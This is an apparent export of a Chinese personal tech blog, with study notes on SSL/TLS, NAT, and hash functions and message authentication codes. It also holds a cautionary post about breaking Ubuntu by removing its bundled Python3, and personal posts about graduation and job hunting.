<p>　　2020，就要迎来人生的又一个个重要的时刻，硕士毕业，参加工作。不读博的我，硕士毕业就显得更加重要，虽然说或许以后还有机会，但是也只是可能。有点不想毕业，又有点期待工作，研究生枯燥的生活让我十分期待参加工作，期待可以赚钱，期待去做更多新的尝试。本命年即将过去，新的开始，希望自己一切都好。</p>
]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title>SSL/TLS 协议</title>
    <url>/2019/12/01/SSL-TLS-%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<p><center>图解密码技术学习笔记-SSL/TLS协议</center><br><a id="more"></a></p>
<h4 id="SSL-TLS-概念"><a href="#SSL-TLS-概念" class="headerlink" title="SSL/TLS 概念"></a>SSL/TLS 概念</h4><p>　　SSL/TLS 协议位于网络 OSI 七层模型的会话层，用来加密通信。SSL（Secure Sockets Layer，安全套接字层）是一种标准安全协议，用于在在线通信中建立Web服务器和浏览器之间的加密链接。SSL 通过互相认证、使用数字签名确保完整性、使用加密确保私密性，以实现客户端和服务器之间的安全通讯。</p>
<p>　　TLS（Transport Layer Security，传输层安全）是 IETF 在 SSL 3.0 的基础上设计的协议，它是 SSL 协议的升级版。两者差别极小，可以理解为 TLS 是 SSL 3.1。</p>
<h4 id="TLS-协议结构"><a href="#TLS-协议结构" class="headerlink" title="TLS 协议结构"></a>TLS 协议结构</h4><p>　　TLS 协议分成两层：TLS 记录协议（TLS record protocol）、TLS 握手协议（TLS handshake protocol）</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/12/1-1.png" alt="1-1"></p>
<p>　　TLS 握手协议负责加密以外的其他事情。握手协议分成 4 个子协议，分别是：</p>
<ul>
<li><strong>握手协议</strong>：负责通信双方之间协商决定密码算法和共享密钥</li>
<li><strong>密码规格变更协议</strong>：负责向通信对象传达变更密码方式的信号</li>
<li><strong>警告协议</strong>：负责在发生错误时将错误传给对方</li>
<li><strong>应用数据协议</strong>：是将TLS承载的应用数据传达给通讯对象</li>
</ul>
<p>　　TLS 记录协议负责消息的压缩、加密以及数据的认证。TLS 记录协议使用到的所有的算法等都是经过握手协议协商确认后的，以保证通讯双方是使用相同的算法。处理过程：</p>
<ul>
<li>首先，消息会被分割成多份，并用协商好的压缩算法进行压缩。</li>
<li>其次，压缩片段会加上消息认证码以保证完整性，为了防止重放攻击还加上了片段编号。</li>
<li>再次，压缩后的消息片段会加上消息认证码一起进行加密。加密使用 CBC 模式，初始向量是通过主密码生成。</li>
<li>最后，加密后的报文，再加上数据类型、版本号、压缩后的长度组成的报头，就是最终的数据报文。</li>
</ul>
<h4 id="握手过程"><a href="#握手过程" class="headerlink" title="握手过程"></a>握手过程</h4><p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/12/1-2.png" alt="1-2"></p>
<ol>
<li><strong>ClientHello（客户端 -&gt; 服务器）</strong></li>
</ol>
<ul>
<li>客户端向服务端发送自己的信息：可用的版本号、当前时间、客户端随机数、会话ID、可用的密码套件清单、可用的压缩方式清单。</li>
<li>可用的版本号、可用的密码套件清单、可用的压缩方式清单：因为不同的浏览器可能支持的情况不一样，所以需要发送给服务端以方便协商。</li>
<li>当前时间：TLS不使用，但是上层的协议有可能使用。</li>
<li>客户端随机数：后面会使用到。</li>
<li>会话ID：客户端和服务端需要重新使用之前的连接时，会使用到此信息。</li>
</ul>
<ol>
<li><strong>ServerHello（服务器 -&gt; 客户端）</strong></li>
</ol>
<ul>
<li>服务端向客户端发送自己的信息：使用的版本号、当前时间、服务器随机数、会话ID、使用的密码套件清单、使用的压缩方式清单</li>
<li>使用的版本号、使用的密码套件清单、使用的压缩方式清单：这里发送的就是协商后的确定结果</li>
<li>当前时间：TLS不使用，但是上层的协议有可能使用</li>
<li>服务器随机数：后面会使用到</li>
</ul>
<ol>
<li><strong>Certificate（服务器 -&gt; 客户端）</strong></li>
</ol>
<ul>
<li>发送服务器的证书，包含证书清单，客户端会对其进行验证。如果是匿名通信，则不发送该消息。</li>
<li>如果 Certificate 不足以满足需求时，则会发送 ServerKeyExchange （服务器 -&gt; 客户端）消息。具体的内容根据密码套件的不同而有所不同。这个不是必须的。</li>
<li>双向认证，服务器则会发送 CertificateRquest（服务器 -&gt; 客户端）找客户端要其证书用来验证。这个也不是必须的。</li>
</ul>
<ol>
<li><strong>ServerHelloDone（服务器 -&gt; 客户端）</strong></li>
</ol>
<ul>
<li>通知客户端 Hello 时间结束。</li>
<li>如果服务器要了客户端的证书，则客户端发送 Certificate（客户端 -&gt; 服务器）将其证书发送给服务器。</li>
</ul>
<ol>
<li><strong>ClientKeyExchange（客户端 -&gt; 服务器）</strong></li>
</ol>
<ul>
<li>这个就是最关键的一步，交换生成最终密钥的关键素材。</li>
<li>如果是使用的 RSA，则会将经过服务器公钥加密的预备主密码随着 ClientKeyExchange 消息一起发送。</li>
<li>如果是 Diffie-Hellman 密钥交换，则随着 ClientKeyExchange 消息一起发送的是 Diffie-Hellman 公开值。</li>
<li>预备主密码使得服务端和客户端分别计算出相同的主密码。</li>
<li>如果服务器向客户端发送了消息，客户端还会向服务器发送 CertificateVerify（客户端 -&gt; 服务器）消息，这是为了向服务器证明，自己确实是真实的客户端，拥有客户端证书的私钥。为了实现这个目的，客户端会计算主密码和握手协议种传送的消息的散列值加上自己的数字签名后发送给服务器。</li>
</ul>
<ol>
<li><strong>生成密钥</strong></li>
</ol>
<ul>
<li>根据关键的密钥素材主密码生成：对称密码的密钥、消息认证码的密钥、对称密码的CBC模式中使用的初始化向量</li>
</ul>
<ol>
<li><strong>ChangeCipherSpec（客户端 -&gt; 服务器）和 Finished（客户端 -&gt; 服务器）</strong></li>
</ol>
<ul>
<li><strong>ChangeCipherSpec</strong><ul>
<li>这不是握手协议，而是密码规格变更协议。客户端告诉服务器我要换密码了。</li>
<li>因为已经双方已经交换了密码套件信息，可以开始切换密码进行通信了。</li>
</ul>
</li>
<li><strong>Finished</strong><ul>
<li>代表客户端已经搞定了</li>
</ul>
</li>
</ul>
<ol>
<li><strong>ChangeCipherSpec（服务器 -&gt; 客户端）</strong>和 <strong>Finished（服务器 -&gt; 客户端）</strong></li>
</ol>
<ul>
<li><strong>ChangeCipherSpec</strong><ul>
<li>服务器告诉客户端，我要开始换密码了</li>
</ul>
</li>
<li><strong>Finished</strong><ul>
<li>代表服务器已经搞定了</li>
</ul>
</li>
</ul>
<p>　　接下来，就可以切换到安全的应用数据交换。</p>
<h4 id="主密码"><a href="#主密码" class="headerlink" title="主密码"></a>主密码</h4><ul>
<li>主密码是根据下面信息计算出来的：预备主密码、客户端随机数、服务器随机数。</li>
<li>如果是 RSA，在握手的时候客户端就会把预备主密码发送给服务器；如果是 Diffie-Hellman，则会发送公开值给服务器，然后客户端和服务器根据这个值生成预备主密码。</li>
<li>客户端随机数和服务器随机数相当于为了防止攻击者事先计算出来的盐值。</li>
<li>使用主密码生成对称密码的密钥、消息认证码的密钥、对称密码的CBC模式中使用的初始化向量。</li>
</ul>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网络地址转换协议：NAT</title>
    <url>/2019/11/30/%E7%BD%91%E7%BB%9C%E5%9C%B0%E5%9D%80%E8%BD%AC%E6%8D%A2%E5%8D%8F%E8%AE%AE%EF%BC%9ANAT/</url>
    <content><![CDATA[<center>2019 年 11 月 26 日，是人类互联网时代值得纪念的一天，全球 43 亿个 IPv4 地址今日正式耗尽。而在IPv4地址不够用时，支持网络的核心技术就是 NAT 协议。</center>

<a id="more"></a>
<h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><p>　　NAT（Network Address Translation，网络地址转换） 技术是一种把内部网络（简称为内网）私有 IP 地址转换为外部网络（简称为外网）公共 IP 地址的技术，它使得一定范围内的多台主机只利用一个公共 IP 地址连接到外网，可以在很大程度上缓解了公网 IPv4 地址紧缺的问题。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/30-1.jpg" alt="30-1"></p>
<p>　　NAT 不仅能缓解 lPv4 地址不足的问题，而且还能够有效地避免来自网络外部的攻击，隐藏并保护网络内部的计算机。目前，IPv4 地址资源的紧缺使得 NAT 技术获得了广泛的应用。</p>
<h4 id="NAT-分类"><a href="#NAT-分类" class="headerlink" title="NAT 分类"></a>NAT 分类</h4><h5 id="静态-NAT"><a href="#静态-NAT" class="headerlink" title="静态 NAT"></a>静态 NAT</h5><p>　　私网和公网 IP 一对一映射，一旦确定，即便不用，其他私网 IP 也不能再使用该公网 IP 地址。借助于静态转换，可以实现外部网络对内部网络中某些特定设备（如服务器）的访问。缺点也很明显，需要独占宝贵的合法 IP 。</p>
<h5 id="动态-NAT"><a href="#动态-NAT" class="headerlink" title="动态 NAT"></a>动态 NAT</h5><p>　　私网和公网 IP 池进行一对一映射，免去了人为的配置，同时可以让有限的公网 IP 地址能够重复使用，但依旧是一个私网 IP 对应一个公网 IP 地址。</p>
<p>　　需要进行数据传输时，从内部全局地址池动态选择一个未使用的地址对内部本地地址进行转换。当数据传输完毕，将地址放回地址池子。</p>
<h5 id="端口地址转换-PAT"><a href="#端口地址转换-PAT" class="headerlink" title="端口地址转换 PAT"></a>端口地址转换 PAT</h5><p>　　真正实现多对一的映射，一个私网 IP 对应一个公网 IP + 端口号，因此端口不同，一个公网 IP 就能被多个私网 IP 地址使用。端口复用，实现了多个内部地址与同一个内部全局地址进行转换。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/30-2.png" alt="30-2"></p>
<h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>　　NAT 通过利用端口号对内部地址和端口号进行转换，并维护一个转换表。主要步骤：</p>
<ul>
<li><p>替换，内网主机访问外网时，利用（公网 IP 地址，新端口号）替换每个外出 IP 数据报的（源 IP 地址，源端口号）</p>
</li>
<li><p>记录，将每对（公网 IP地址，新端口号）与（源IP地址，源端口号）的替换信息存储到 NAT 转换表中。</p>
</li>
<li><p>替换，根据 NAT 转换表，利用（源 IP 地址，源端口号）替换每个进入内网 IP 数据报的（目的 IP 地址，目的端口号），即（公网 IP 地址，新端口号）</p>
</li>
</ul>
<p>　　NAT 丢弃不活跃链接的时候，是不会通知内网的你以及外网的程序的，也就是说，是不可能重建的。这样就带来了一个问题，假如有的应用程序需要长时间的链接呢？ </p>
<p>　　最合理的方法当然就是自己实现心跳包，每隔一段时间程序发送一个小包给对方，对方也发回来，不仅保活，也可以检查服务是否遇到不可知错误而中断。当然，不一定需要自己实现心跳包，对稳定性需求不高，可以用 linux 内核提供的 TCP keep-alive。启用后，系统会按设定的时间（默认是2小时），发送一个包过去。</p>
<h4 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h4><p>　　NAT可以分为 SNAT（Source Network Address Translation，源网络地址转换）、MASQUERADE（ IP 地址伪装）和 DNAT（Destination Network Address Translation，目的网络地址转换）两种模式。Linux 的 NAT 可以通过 iptables 配置实现。</p>
<h5 id="SNAT"><a href="#SNAT" class="headerlink" title="SNAT"></a>SNAT</h5><p>　　内部地址要访问公网上的服务时，内部地址会主动发起连接，将内部地址转换成公有 IP。例如，内网的多个 PC 机访问外部网络的时候，具有公网 IP 的路由器将数据包的报头中的源地址替换成路由器的 IP，当外部网络的服务器接到访问请求的时候，记录下来的是路由器的 IP 地址，而不是 PC 机的内网 IP，因为服务器收到的数据包的“源地址”已经被替换。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/30-3.png" alt="30-3"></p>
<h5 id="MASQUERADE"><a href="#MASQUERADE" class="headerlink" title="MASQUERADE"></a>MASQUERADE</h5><p>　　SNAT 中的一种特例，可以实现自动化的 SNAT。采用 SNAT 时，对于那些 IP 不固定的场合，比如拨号网络或者通过dhcp分配IP的情况下，出口 IP 经常会改变，而 iptables 规则内的 IP 是不会随着自动变化的，每次地址变化后都必须手工修改一次 iptables，把规则里边的固定 IP 改成新的 IP 。MASQUERADE 就是针对这种场景而设计的，它可以从服务器的网卡上自动获取当前 IP 地址来做 NAT。</p>
<h5 id="DNAT"><a href="#DNAT" class="headerlink" title="DNAT"></a>DNAT</h5><p>　　当内部需要对外提供服务时，外部发起主动连接，路由器或着防火墙的网关接收到这个连接，然后把连接转换到内部，此过程是由带公有 IP 的网关代替内部服务来接收外部的连接，然后在内部做地址转换。主要用于内部服务对外发布。典型应用就是 Web 服务器放在内网，配置内网 IP，前端有个防火墙，配置公网 IP，互联网上的访问者使用公网 IP 来访问这个网站。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/30-4.png" alt="30-4"></p>
<h4 id="展望"><a href="#展望" class="headerlink" title="展望"></a>展望</h4><p>　　随着 IPv4 地址的耗尽，再经济的模式也无以为继，IPv4 必须退出历史舞台。人们自然会认为，NAT作为 IPv4的超级补丁技术使命已经完结。</p>
<p>　　实际上，IPv4 向 IPv6过渡的阶段，NAT 仍然是一种必不可少的技术。因为 Internet 无法在一日之内完成全网升级，必然是局部升级，逐渐替换。在两套协议并存的时期，用户和服务资源分布在不同网络之间，跨网访问的需求必须得到满足。而这正是 NAT 所擅长的领域：地址替换，因此 NAT-PT（Network Address Translator - Protocol Translator，附带协议转换器的网络地址转换器，是一种纯 IPv6 节点和IPv4节点间的互通方式）应运而生。由于 IPv4 和 IPv6 之间的差异，NAT 要做的事比以往更复杂，有更多的限制和细节。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>NAT</tag>
      </tags>
  </entry>
  <entry>
    <title>散列函数与消息认证码</title>
    <url>/2019/11/18/%E6%95%A3%E5%88%97%E5%87%BD%E6%95%B0%E4%B8%8E%E6%B6%88%E6%81%AF%E8%AE%A4%E8%AF%81%E7%A0%81/</url>
    <content><![CDATA[<center>图解密码技术学习笔记-散列函数与消息认证码</center>

<a id="more"></a>
<h4 id="单向散列函数"><a href="#单向散列函数" class="headerlink" title="单向散列函数"></a>单向散列函数</h4><h5 id="概念与性质"><a href="#概念与性质" class="headerlink" title="概念与性质"></a>概念与性质</h5><p>　　单向散列函数，又称单向 Hash 函数、杂凑函数，就是把任意长的输入消息串变化成固定长的输出串且由输出串难以得到输入串的一种函数。</p>
<p>　　单向散列函数可以根据消息的内容计算出散列值，而散列值就可以被用来检查消息的完整性。散列值的长度与消息的长度无关。具有以下性质：</p>
<ul>
<li>根据任意长度的消息计算出固定长度的散列值；</li>
<li>能够快速计算出散列值；</li>
<li>消息不同散列值也不同；</li>
<li>具备单向性，即无法通过散列值反算出消息。</li>
</ul>
<p>　　密码学中使用的单向散列函数，不仅要具备弱抗碰撞性，还必须具备强抗碰撞性。</p>
<ul>
<li><strong>抗碰撞性</strong>：难以发现碰撞的性质称为”抗碰撞性”。</li>
<li><strong>弱抗碰撞性</strong>：给定某条消息的散列值，必须保证要找到和这条消息相同散列值的另一条消息是非常困难的。</li>
<li><strong>强抗碰撞性</strong>：要找到散列值相同的两条不同的消息是非常困难的。</li>
</ul>
<p>　　单向散列函数输出的散列值也称为消息摘要或者指纹。消息的完整性也叫一致性。</p>
<h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><ul>
<li>MD4、MD5（128位，其强抗碰撞性已经被攻破）</li>
<li>SHA-1（160位，其强抗碰撞性已经被攻破）、SHA-256、SHA-384、SHA-512</li>
</ul>
<h5 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h5><ul>
<li><p><strong>检测软件是否被篡改</strong></p>
<p>软件发布者将散列值公开发布到网上，使用软件的人就可以根据这个来判断获得的软件是否已经被篡改。</p>
</li>
<li><p><strong>基于口令的加密</strong><br>PBE(Password Based Encryption)基于口令的加密，是将口令和salt（随机数）混合后计算其散列值，作为加密的密钥。这样可以抵御针对口令的字典攻击。</p>
</li>
<li><p><strong>消息认证码</strong><br>消息认证码是将”发送者和接收者之间的共享密钥”和”消息”进行混合计算出的散列值。使用消息认证码可以检测并防止通信过程中的错误、篡改以及伪装。在SSL/TLS中得到了运用。</p>
</li>
<li><p><strong>数字签名</strong><br>数字签名非常的耗时，所以不会对整个消息进行数字签名。一般先计算出消息的散列值，然后再针对散列值进行数字签名。</p>
</li>
<li><p><strong>伪随机数生成器</strong><br>伪随机数需要具备”事实上不可能根据过去的随机数列预测未来的随机数列”这样的性质。为了保证不可预测性，可以利用单向散列函数的单向性。</p>
</li>
<li><p><strong>一次性口令</strong><br>一次性口令通常被用于服务器对客户端的合法性认证。这种方式中，通过使用单向散列函数可以保证口令只在通信链路上传送一次，因此即使窃听者窃取了口令，也无法使用。</p>
</li>
</ul>
<h5 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h5><ul>
<li><strong>暴力破解</strong>。本质是破解弱抗碰撞性。针对某一特定的消息找到与其相同的散列值的消息进行替换。从消息的冗余性入手，即在不改变消息意思的前提下能够对文件内容进行修改的程度，只要找到一份跟原文相同的散列值即可。</li>
<li><strong>生日攻击</strong>。本质是破解强抗碰撞性。所谓的生日攻击就是：随机选出N个人，其中任意两个人的生日相同的概率大于二分之一，请问N为多少？在这里，攻击是指，只要任何两份文档存在相同的散列值时，即可达成攻击。编写消息的人是攻击者。攻击者首先生成两份散列值相同，但内容不同的文件。其中一份要B支付1百万的合同给了A，A生成散列值后发送给B。攻击者截获此报文后，替换成散列值相同的要B支付1亿元的合同。</li>
</ul>
<h5 id="无法解决的问题"><a href="#无法解决的问题" class="headerlink" title="无法解决的问题"></a>无法解决的问题</h5><p>　　单向散列函数能够辨别出篡改，但无法识别出伪装，也就是无法判断出发送消息的人是否是正确的。</p>
<h4 id="消息认证码"><a href="#消息认证码" class="headerlink" title="消息认证码"></a>消息认证码</h4><h5 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h5><p>　　消息的认证指的是消息来自正确的发送者。消息认证码是一种与密钥相关的单向散列函数。单向散列函数保证了完整性，无法被篡改；共享密钥只有发送者和接收者知道，保证了可以检查发送者身份的正确性。</p>
<p>　　消息认证码的输入是任意长度的消息和一个发送者与接收者之间共享的密钥<strong>，</strong>输出是固定长度的数据，这个数据称为MAC值。</p>
<p>　　消息认证码同时解决消息的完整性和发送者正确性。</p>
<ul>
<li><strong>消息完整性</strong>解决的是消息是否有被篡改的问题，也就是保证了消息的完整性。</li>
<li><strong>消息认证</strong>解决的是消息的发送者正确性的问题，确保消息不是其他人伪装发送的。</li>
</ul>
<h5 id="使用过程"><a href="#使用过程" class="headerlink" title="使用过程"></a>使用过程</h5><ul>
<li>发送者发送消息后，使用发送的消息和共享密钥计算出 MAC 值，并发送给接收者；</li>
<li>接收者接收到消息后，使用接收到的消息和共享密钥计算出 MAC 值；</li>
<li>接收者接收到 MAC 值后，使用接收到的 MAC 值和自己计算的 MAC 值做比对。如果相同，则表示消息没有被篡改，且发送者的身份正确。</li>
</ul>
<h5 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h5><ul>
<li>使用 SHA-1 等单向散列函数实现，其中一种实现方式为 HMAC。</li>
<li>使用 AES 等分组密码实现。 <ul>
<li>分组的密钥作为共享密钥。</li>
<li>使用 CBC 模式进行加密。CBC 模式就是前一个分组的密文与此分组的明文 XOR 后，再加密生成当前分组的密文。</li>
<li>由于不需要进行解密，所以只保留最后一个分组。由于最后一个分组会受到密钥和整个消息的双重影响，所以可以作为消息认证码。</li>
</ul>
</li>
<li>流密码和公钥密码也可以实现消息认证码。</li>
</ul>
<h5 id="应用实例"><a href="#应用实例" class="headerlink" title="应用实例"></a>应用实例</h5><ul>
<li><strong>SWIFT</strong></li>
</ul>
<p>　　用于银行与银行之间传递交易消息，使用了消息认证码保障完整性和对消息进行验证。共享密钥在使用公钥密码之前，是用人进行配送的。</p>
<ul>
<li><strong>IPsec</strong></li>
</ul>
<p>　　针对 IP 协议增加安全性的一种方式，使用消息认证码对消息内容进行认证和保证完整性。</p>
<ul>
<li><strong>SSL/TLS</strong></li>
</ul>
<p>　　安全套接字协议和安全传输层协议。</p>
<h5 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h5><ul>
<li><strong>重放攻击</strong></li>
</ul>
<p>　　攻击者可以截获发送者的消息和 MAC 值，然后对接收者重放发送。这时虽然攻击者没有破解消息认证码，但对于接收者来说消息和 MAC 值是匹配的，所以还是会执行。解决的办法：</p>
<ul>
<li><strong>序号</strong>。增加一个流水号，每次都加1。有效果，但是通信双方都需要记录最后一个消息的序号。</li>
<li><strong>时间戳</strong>。发送消息中包含当前时间，如果收到以前的消息则当做错误消息不执行。有效果，但是通信双方的时钟必须一致，不一致也会留下重放攻击的空间。</li>
<li><strong>Nonce</strong>。先发送一个伪随机数（称为 Nonce），然后发送消息计算 MAC 值时包含 Nonce。由于每次通信 Nonce 都会发生变化，也就无法进行重放攻击。此办法的缺点是增加了通信量。</li>
<li><strong>密钥推测攻击</strong></li>
</ul>
<p>　　如果是单向散列函数来进行生成 MAC，则使用攻击单向散列函数的暴力破解和生日攻击来完成攻击。</p>
<h5 id="无法解决的问题-1"><a href="#无法解决的问题-1" class="headerlink" title="无法解决的问题"></a>无法解决的问题</h5><ul>
<li><strong>对第三方认证</strong></li>
</ul>
<p>　　如果接收者想要让第三方来认证发送者，这点是没法办到的。因为共享密钥只有一个，对于第三方来说无法通过共享密钥来判断到底哪个是发送者，哪个是接收者。</p>
<ul>
<li><strong>防止否认</strong></li>
</ul>
<p>　　发送者可以否认自己发送过消息，通过消息认证码是无法防止否认的。</p>
]]></content>
      <categories>
        <category>Network</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu 16.04 卸载自带 Python3 引发的惨案</title>
    <url>/2019/11/14/Ubuntu-16-04-%E5%8D%B8%E8%BD%BD%E8%87%AA%E5%B8%A6-Python3-%E5%BC%95%E5%8F%91%E7%9A%84%E6%83%A8%E6%A1%88/</url>
    <content><![CDATA[<center>由于无知，卸载 Ubuntu 自带的 python3 引发惨案，谨记，深刻反思。</center>

<a id="more"></a>
<h4 id="惨案"><a href="#惨案" class="headerlink" title="惨案"></a>惨案</h4><p>　　由于实验需要使用 Python3.6 以上版本，于是决定卸载 Python3.5。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 卸载 python3.5</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get remove python3.5</span></div></pre></td></tr></table></figure>
<p>　　没用，终端输入 python3 还是可以使用。于是，网上查找卸载python3.5的方法：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 卸载 python3.5 及其依赖</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get remove --auto-remove python3.5</span></div><div class="line"><span class="meta">#</span><span class="bash"> 清除 python3.5</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get purge python3.5</span></div><div class="line">or</div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get purge --auto-remove python3.5</span></div></pre></td></tr></table></figure>
<p>　　接下来，终端输入 python3 依然还是可以使用。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 删除链接</span></div><div class="line">sudo rm /usr/bin/python3</div></pre></td></tr></table></figure>
<p>　　然后，突然发现侧边菜单栏变灰，感觉不对劲，重启。然后，侧边菜单栏不见了，右键连打开终端的选项都没有了。</p>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/14-1.jpg" alt="14-1"></p>
<p>　　于是，查找解决方案：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 切换到命令行模式</span></div><div class="line">ctrl+alt+t</div><div class="line"><span class="meta">#</span><span class="bash"> 失败，再次尝试</span></div><div class="line">ctrl+alt+F1</div><div class="line"><span class="meta">#</span><span class="bash"> 成功</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt install -f</span></div><div class="line"><span class="meta">#</span><span class="bash"> 重新安装桌面</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo apt-get -f install ubuntu-minimal ubuntu-standard ubuntu-desktop</span></div><div class="line"><span class="meta">#</span><span class="bash"> 重启</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo reboot</span></div></pre></td></tr></table></figure>
<p>　　重启后，菜单栏又出现了。但是，终端依然没有。可以在  xterm 或者 中尝试安装：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> sudo apt install gnome-terminal</span></div></pre></td></tr></table></figure>
<p>　　但是，一般是不起作用的，还是打不开。由于系统中很多软件都是依赖 python3，所以卸载了 python3 导致了系统崩溃。即使安装了 python3.6+ 并设置了 python3 的软连接，依然不行。</p>
<p>　　可以尝试重装 python3.5，然后设置 python3 软连接。也可以尝试以下方法：</p>
<ul>
<li><a href="https://blog.csdn.net/tao_627/article/details/91042809" target="_blank" rel="external">https://blog.csdn.net/tao_627/article/details/91042809</a></li>
<li><a href="https://blog.csdn.net/qs521/article/details/98945938" target="_blank" rel="external">https://blog.csdn.net/qs521/article/details/98945938</a></li>
</ul>
<p>　　惨案发生后，即使菜单栏回来了，终端或许也能打开了，但是使用 apt 安装软件一直报 dpkg 的错误，找了很多方法也没有解决，所以还是决定重新装系统了。</p>
<h4 id="正确安装-Python-3-6"><a href="#正确安装-Python-3-6" class="headerlink" title="正确安装 Python 3.6+"></a>正确安装 Python 3.6+</h4><p>　　正确的方式就是不要轻易删除 python3 及其依赖。特别是不要删除依赖。在 Ubuntu16.04 中修改 python3 指向 3.6+ 版本以后，某些软件会无法使用，比如终端，需要使用上面连接的方法进行相应的处理。</p>
<p>　　安装 Python3.6+ 以上版本的正确姿势：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 从官网下载对应版本的源码</span></div><div class="line">https://www.python.org/downloads/source/</div><div class="line"><span class="meta">#</span><span class="bash"> 解压</span></div><div class="line"><span class="meta">$</span><span class="bash"> tar -zxvf xxxxx</span></div><div class="line"><span class="meta">$</span><span class="bash"> <span class="built_in">cd</span> xxxx</span></div><div class="line"><span class="meta">#</span><span class="bash"> 创建安装目录</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo mkdir -p /usr/<span class="built_in">local</span>/python3</span></div><div class="line"><span class="meta">#</span><span class="bash"> 配置、编译、安装</span></div><div class="line"><span class="meta">$</span><span class="bash"> ./configure --preifx=/usr/<span class="built_in">local</span>/python3 --<span class="built_in">enable</span>-optimizations</span></div><div class="line"><span class="meta">$</span><span class="bash"> make</span></div><div class="line"><span class="meta">$</span><span class="bash"> sudo make install</span></div></pre></td></tr></table></figure>
<p>　　安装以后，不修改 python3 的指向，可以为 python3.6+ 版本指定不同的链接名：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> 添加 python37 的软链接</span></div><div class="line"><span class="meta">$</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/python3/bin/python3.7 /usr/bin/python37</span></div><div class="line"><span class="meta">#</span><span class="bash"> 添加 pip3 的软链接（这样pip3就是python3.7专用的，也可以起名为 pip37，不影响python3.5的pip3）</span></div><div class="line"><span class="meta">$</span><span class="bash"> ln -s /usr/<span class="built_in">local</span>/python3/bin/pip3.7 /usr/bin/pip3</span></div></pre></td></tr></table></figure>
<p>　　检测版本，查看是否成功：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><div class="line"><span class="meta">$</span><span class="bash"> python37 -V</span></div><div class="line"><span class="meta">$</span><span class="bash"> pip3 -V</span></div></pre></td></tr></table></figure>
<p><img src="https://fzy-blog.oss-cn-shenzhen.aliyuncs.com/2019/11/14-2.jpg" alt="14-2"></p>
<p>　　重新安装系统、软件、搭建实验环境，真的是心累啊。谨记，以后不要随便卸载系统自带软件，特别是不要相信某些博客写的彻底清除xxx及其依赖的操作。</p>
]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Mysql</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>秋招-更好地认识自己</title>
    <url>/2019/11/11/%E7%A7%8B%E6%8B%9B-%E6%9B%B4%E5%A5%BD%E5%9C%B0%E8%AE%A4%E8%AF%86%E8%87%AA%E5%B7%B1/</url>
    <content><![CDATA[<p><center>一场秋招，让我更好地认识了自己。</center><br><a id="more"></a></p>
<p>　　忙碌的九月，不太开心的十月，终于，秋招结束了。虽然秋招也拿了很多的offer，但是没有什么让自己特别满意的，当初想去的公司都没有通过，最后选择了招银网络科技。不过，去招银也算是自己喜欢的方向，符合自己对未来的规划。最近看到群里未来同事大部分都来自于武大、厦大、华科、中南、电子科大、川大、湖大等学校，我也就放心了。</p>
<p>　　秋招的这一个多月，最终拿到的 offer 有，招银网络科技、中兴、深信服、去哪儿网、联通软件研究院、金山云、映客直播、电信研究院。其中，深信服是暑假实习的公司，实习结束前，架构师和部门主管面试了我，然后，9月份就发了 offer。后来发现，HR 开工资有点套路我的意思，而且9月底就开始逼签了，当时有点不爽就拒绝啦。后来，负责长沙秋招的HR、实习部门的主管和 HRBP 相继找我聊天，问我是不是还考虑去。其实，之前拒绝的时候就思考了很久，后来他们找我聊天的时候，我觉得既然已经做出决定了就不后悔了。感觉深信服的文化和华为，加班多，网上评价也不怎么好。但是，实习体验还是不错的，公司的福利、团队氛围都还可以，他们也确实是求贤若渴。</p>
